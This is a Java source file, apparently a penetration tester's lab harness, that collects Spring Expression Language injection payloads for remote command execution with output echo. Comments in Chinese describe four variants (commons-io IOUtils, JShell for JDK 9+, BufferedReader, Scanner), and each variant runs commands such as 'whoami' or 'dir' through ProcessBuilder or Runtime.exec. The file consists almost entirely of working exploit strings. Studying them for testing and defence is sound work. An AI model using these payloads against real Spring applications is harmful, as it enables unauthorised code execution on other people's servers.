package com.test;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class RceEcho {
    public static void main(String[] args) {
//        commons_io();
//        br();
        scanner();
    }

    /*必须有commons-io依赖*/
    public static void commons_io(){
        String cmdStr = "T(org.apache.commons.io.IOUtils).toString((new java.lang.ProcessBuilder(new String[]{'whoami'}).start()).getInputStream())";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );
    }

    /*仅适用于jdk>=9*/
    public static void jShell(){
        String cmdStr = "T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(\"jdk.jshell.JShell\",true).Methods[6].invoke(null,{}).eval(\"T(Runtime).getRuntime().exec('whoami')\").toString()";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );
    }

    /*缺点：只能读一行*/
    public static void br(){
        String cmdStr = "new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\"cmd\", \"/c\", \"whoami\").start().getInputStream(), \"gbk\")).readLine()\n";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(cmdStr);
        System.out.println( exp.getValue() );
    }

    /*useDelimiter内的参数为分割标志，所以随便填一个，这样回显结果才完整*/
    public static void scanner(){
        String cmdStr = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd\", \"/c\", \"dir\", \".\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()\n";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(cmdStr);
        System.out.println( exp.getValue() );
    }

}
